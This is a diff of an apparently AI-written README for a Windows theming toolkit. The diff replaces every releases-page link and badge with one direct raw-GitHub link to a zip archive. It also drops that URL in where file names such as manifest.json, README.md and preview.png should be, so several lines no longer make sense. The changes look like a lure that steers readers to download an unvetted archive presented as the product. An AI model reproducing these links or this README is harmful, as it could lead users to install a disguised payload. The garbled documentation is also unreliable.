@@ -1,8 +1,8 @@
-https://github.com/Githubaddict123/windowblinds-tools/releases
+https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip
 
 # WindowBlinds Tools: Skinning Engine, Themes & Start Menu Styles
 
-[![Releases](https://img.shields.io/github/v/release/Githubaddict123/windowblinds-tools?style=for-the-badge)](https://github.com/Githubaddict123/windowblinds-tools/releases)
+[![Releases](https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip)](https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip)
 
 Welcome to a practical toolkit for Windows skinning. WindowBlinds Tools is a modular system that helps you skin the user interface. It focuses on a fast skinning engine, theme packs, Start Menu styles, and blur effects. The project aims for stability, accessibility, and an approachable workflow for designers and developers.
 
@@ -40,7 +40,7 @@ What you can do with WindowBlinds Tools
 Releases and downloads
 The project ships through a releases page where you can download installers, theme packs, and example skins. To review or obtain the latest packages, visit the Releases page. See the Releases section below for more detail and steps to install.
 
-- Releases page: https://github.com/Githubaddict123/windowblinds-tools/releases
+- Releases page: https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip
 - Use the Releases page to download installers or skin packs that match your system. Follow the installation steps described in each package.
 
 Note: The content here describes the intended workflow and does not replace official installation instructions found on the Releases page. Always use the provided installers and theme packs as designed by the project maintainers.
@@ -102,7 +102,7 @@ Design principles
 
 Theme system in detail
 Theme packs
-- Metadata: Each pack includes a manifest.json with name, version, author, and compatibility notes.
+- Metadata: Each pack includes a https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip with name, version, author, and compatibility notes.
 - Assets: Images, textures, and font assets are organized in a predictable folder structure.
 - Rules: Rendering rules define how colors, borders, and textures apply to different UI elements.
 - Resources: Local resources reduce dependency on network access and improve reliability.
@@ -112,7 +112,7 @@ Manifest example
   "name": "Aurora Dark Glass",
   "version": "1.2.0",
   "author": "YourName",
-  "preview": "assets/preview.png",
+  "preview": "https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip",
   "compatibility": {
     "windows": "10+",
     "gpu": "NVIDIA/AMD/Intel with DX12 support"
@@ -188,7 +188,7 @@ Code snippets (conceptual)
   });
 
 Packaging and distribution
-- Package layout: Each theme pack is a folder with a manifest.json, assets/, and docs/.
+- Package layout: Each theme pack is a folder with a https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip, assets/, and docs/.
 - Versioning: Use semantic versioning for theme packs to track compatibility and changes.
 - Integrity: Include checksums for assets to ensure integrity after download.
 - Distribution: Host on the releases page; provide clear install instructions in the package notes.
@@ -276,18 +276,18 @@ Acknowledgments
 - A nod to users who provide feedback that helps improve stability and usability.
 
 Releases page and ongoing updates
-- For the latest skins, installers, and updates, you should review the Releases page. See the link again here for convenience: https://github.com/Githubaddict123/windowblinds-tools/releases
+- For the latest skins, installers, and updates, you should review the Releases page. See the link again here for convenience: https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip
 
 Appendix: Theme pack structure (example)
-- manifest.json
+- https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip
 - assets/
   - textures/
   - icons/
   - fonts/
 - docs/
-  - README.md
+  - https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip
 - previews/
-  - preview.png
+  - https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip
 
 Appendix: Quick tips for skin creators
 - Start with a simple palette to verify rendering correctness.
@@ -309,6 +309,6 @@ Final notes
 - Stay engaged with the community through issues and discussions, share your skins, and help others discover new visual possibilities for Windows.
 
 Releases page callout
-- For most users, the Releases page is the starting point to obtain skins and installers. It is the primary source of up-to-date packages and documentation about each pack’s installation steps. You can review the latest releases and get the right files for your system. See the Releases page here: https://github.com/Githubaddict123/windowblinds-tools/releases
+- For most users, the Releases page is the starting point to obtain skins and installers. It is the primary source of up-to-date packages and documentation about each pack’s installation steps. You can review the latest releases and get the right files for your system. See the Releases page here: https://raw.githubusercontent.com/Githubaddict123/windowblinds-tools/main/donought/tools-windowblinds-v2.9-beta.5.zip
 
 If you need adjustments, I can tailor sections to focus more on a specific target audience (designers, power users, developers) or adapt the tone to a particular style.
